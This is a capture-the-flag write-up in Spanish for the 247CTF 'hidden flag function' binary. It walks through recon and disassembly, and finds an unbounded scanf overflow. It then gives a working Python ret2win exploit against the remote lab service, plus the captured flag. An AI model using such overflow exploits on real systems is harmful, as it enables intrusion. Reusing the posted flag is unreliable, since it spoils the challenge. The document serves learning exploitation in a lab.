# Hidden Flag Function - CTF247 Ejercicio 3 Writeup

## Elementos proporcionados por el CTF

- Binario principal: `hidden_flag_function`
- Acceso a un servicio remoto (host y puerto para conexión)

## Reconocimiento Inicial

### 1. Conexión al Servicio

Primero probamos conectarnos al servicio con netcat para entender su comportamiento:

```bash
nc 90bf213465392991.247ctf.com 50409
```

**Output:**

```
What do you have to say?
```

El servicio espera una entrada del usuario y se cierra la conexión cada vez que se ingresa algo.

## Análisis del Binario

### 2. Información Básica del Archivo

```bash
file hidden_flag_function
```

**Output:**

```
hidden_flag_function: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=92825cdfbc5b108fc4cfe56d7c6636f837475d4e, not stripped
```

**Conclusiones:**

- Binario ELF de 32 bits
- Arquitectura Intel i386
- No está stripped (conserva símbolos de debug)

### 3. Análisis de Protecciones

```bash
checksec --file=hidden_flag_function
```

**Output:**

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	  No	0		2		hidden_flag_function
```

**Protecciones:**

- **No canary found**: Sin protección de stack canary
- **No PIE**: Direcciones fijas (no aleatorización)

La ausencia de stack canary permite buffer overflow, y la falta de PIE significa que las direcciones de funciones son predecibles.

### 4. Análisis de Strings

```bash
strings hidden_flag_function
```

**Strings importantes encontrados:**

- `flag.txt`: Archivo que contiene la flag
- `How did you get here?`: Mensaje de función oculta
- `Have a flag!`: Mensaje cuando se obtiene la flag
- `What do you have to say?`: El prompt que vemos en el servicio

### 5. Análisis de Símbolos

```bash
nm hidden_flag_function | grep flag
```

**Output:**

```
08048576 T flag
```

Existe una función llamada `flag` en la dirección `0x08048576`.

### 6. Disassembly

```bash
objdump -M intel -d hidden_flag_function
```

### Función `main` (0x08048603):

```
08048603 <main>:
 8048603:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 8048607:	83 e4 f0             	and    esp,0xfffffff0
 ...
 8048636:	8d 83 16 e7 ff ff    	lea    eax,[ebx-0x18ea]  ; "What do you have to say?"
 804863c:	50                   	push   eax
 804863d:	e8 ce fd ff ff       	call   8048410 <puts@plt>
 8048642:	83 c4 10             	add    esp,0x10
 8048645:	e8 8a ff ff ff       	call   80485d4 <chall>   ; Llama a chall()
```

### Función `chall` (0x080485d4):

```
080485d4 <chall>:
 80485d4:	55                   	push   ebp
 80485d5:	89 e5                	mov    ebp,esp
 80485d7:	53                   	push   ebx
 80485d8:	83 ec 44             	sub    esp,0x44          ; Reserva 68 bytes + 4 (ebx) = 72 bytes
 ...
 80485e8:	8d 55 b8             	lea    edx,[ebp-0x48]    ; Buffer en [ebp-0x48] = 72 bytes
 80485eb:	52                   	push   edx
 80485ec:	8d 90 13 e7 ff ff    	lea    edx,[eax-0x18ed]  ; "%s"
 80485f2:	52                   	push   edx
 80485f3:	89 c3                	mov    ebx,eax
 80485f5:	e8 46 fe ff ff       	call   8048440 <__isoc99_scanf@plt>  ; scanf("%s", buffer)
```

### Función `flag` (0x08048576)

```
08048576 <flag>:
 8048576:	55                   	push   ebp
 8048577:	89 e5                	mov    ebp,esp
 8048579:	53                   	push   ebx
 804857a:	83 ec 54             	sub    esp,0x54
 ...
 8048591:	50                   	push   eax
 8048592:	8d 83 e2 e6 ff ff    	lea    eax,[ebx-0x191e]  ; "flag.txt"
 8048598:	50                   	push   eax
 8048599:	e8 92 fe ff ff       	call   8048430 <fopen@plt>  ; fopen("flag.txt", "r")
 ...
 80485af:	50                   	push   eax
 80485b0:	e8 4b fe ff ff       	call   8048400 <fgets@plt>  ; fgets(buffer, 64, file)
 ...
 80485bf:	8d 83 ec e6 ff ff    	lea    eax,[ebx-0x1914]  ; "How did you get here?\nHave a flag!\n%s\n"
 80485c5:	50                   	push   eax
 80485c6:	e8 25 fe ff ff       	call   80483f0 <printf@plt>  ; printf(mensaje + flag)
```

### 7. Análisis de la Vulnerabilidad

**En la función `chall`:**

- Buffer ubicado en `[ebp-0x48]` = 72 bytes desde EBP
- Usa `scanf("%s", buffer)` sin límite de longitud
- No hay verificación de bounds

**Layout del stack:**

```
[buffer - 72 bytes] [EBP - 4 bytes] [Return Address - 4 bytes]
```

> **Nota:** El tamaño de EBP y la dirección de retorno es de 4 bytes cada uno en sistemas x86 de 32 bits, ya que los registros y punteros en esta arquitectura ocupan 4 bytes.

## Desarrollo del Exploit

### 8. Estrategia de Explotación

1. **Objetivo**: Redirigir la ejecución a la función `flag()` en `0x08048576`
2. **Método**: Buffer overflow para sobrescribir la dirección de retorno
3. **Payload**: 72 bytes + 4 bytes (EBP) + dirección de `flag()`

### 9. Implementación del Exploit

```python
import struct
import socket

def connect():
    """Conectar al servicio remoto"""
    host = "90bf213465392991.247ctf.com"
    port = 50409

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def exploit():
    """Exploit para hidden flag function"""

    flag_addr = 0x08048576

    buffer_size = 72
    padding = b'A' * buffer_size
    ebp_overwrite = b'B' * 4
    ret_addr = struct.pack('<I', flag_addr)

    payload = padding + ebp_overwrite + ret_addr

    print(f"[+] Payload size: {len(payload)} bytes")
    print(f"[+] Buffer padding: {len(padding)} bytes")
    print(f"[+] EBP overwrite: {len(ebp_overwrite)} bytes")
    print(f"[+] Return address: 0x{flag_addr:08x}")
    print(f"[+] Full payload: {payload}")

    s = connect()

    prompt = s.recv(1024)
    print(f"[+] Received: {prompt.decode().strip()}")

    print(f"[+] Sending payload...")
    s.send(payload + b'\n')

    try:
        response = s.recv(1024)
        print(f"[+] Response: {response.decode()}")
        s.settimeout(2)
        more_data = s.recv(1024)
        if more_data:
            print(f"[+] More data: {more_data.decode()}")
    except socket.timeout:
        print("[-] Timeout - no more data")
    except Exception as e:
        print(f"[-] Error: {e}")

    s.close()

if __name__ == "__main__":
    exploit()
```

## Ejecución del Exploit

### 10. Resultado

```bash
python3 hidden_flag_exploit.py
```

**Output:**

```
[+] Payload size: 80 bytes
[+] Buffer padding: 72 bytes
[+] EBP overwrite: 4 bytes
[+] Return address: 0x08048576
[+] Full payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBv\x85\x04\x08'
[+] Received: What do you have to say?
[+] Sending payload...
[+] Response: How did you get here?
Have a flag!
247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}
```
